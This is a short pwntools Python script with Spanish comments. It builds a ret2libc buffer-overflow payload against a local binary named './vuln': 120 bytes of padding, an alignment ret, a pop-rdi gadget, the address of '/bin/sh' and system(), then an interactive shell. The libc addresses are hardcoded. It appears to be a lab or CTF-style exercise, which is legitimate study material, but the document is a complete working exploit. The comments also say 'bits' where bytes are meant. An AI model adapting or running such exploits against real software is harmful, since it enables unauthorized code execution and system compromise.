#!/usr/bin/python3
# coding: utf-8

from pwn import *

libc_base = 0x00007ffff7dd0000
system_addr = libc_base + 0x4c330
binsh_addr = libc_base + 0x196031
pop_rdi_ret = libc_base + 0x27725
ret = libc_base + 0x27726


log.info ("system: " + str(hex(system_addr)))
log.info ("binsh: " + str(hex(binsh_addr)))
log.info ("pop_rdi_ret: " + str(hex(pop_rdi_ret)))

pause()

p = process ("./vuln")

payload = b""
payload += b"A"*120
# Algunas funciones (ej. moveaps) requieren que RSP esté alineado a 16 bits. Por esa razón, dado que 120 "A"s implican 
# que RSP no está alineado a 16 bits (por 8 bits que faltan --> 120/16 = 7,5), aquí añadimos una instruccion ret 
# (que ocupa 8 bits), para que el stack esté alineado a 16 bits (ultimo byte a 0 cuando llamamos a system)
payload += p64 (ret) 
payload += p64(pop_rdi_ret)
payload += p64(binsh_addr)
payload += p64(system_addr)
	
log.info ("Sending payload...")

p.sendline(payload)
p.recv()
p.interactive()
